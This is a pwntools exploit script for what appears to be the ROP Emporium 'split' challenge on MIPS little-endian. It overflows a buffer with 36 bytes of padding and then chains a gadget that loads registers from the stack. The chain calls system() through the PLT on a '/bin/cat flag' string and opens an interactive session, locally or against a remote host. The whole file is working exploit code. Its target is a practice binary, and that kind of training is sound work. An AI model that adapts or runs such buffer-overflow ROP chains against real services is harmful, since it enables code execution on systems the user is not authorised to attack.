from pwn import *

splash()
elf = context.binary = ELF("./split_mipsel")


class ROP:
    gadget1 = 0x00400a1c  # nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
    bin_cat = 0x00411010


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    log.info(f"Address: {hex(elf.plt.system)}")

    payload = [
        padding,
        ROP.gadget1,
        0xDEADBEEF,
        elf.plt.system,
        ROP.bin_cat
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()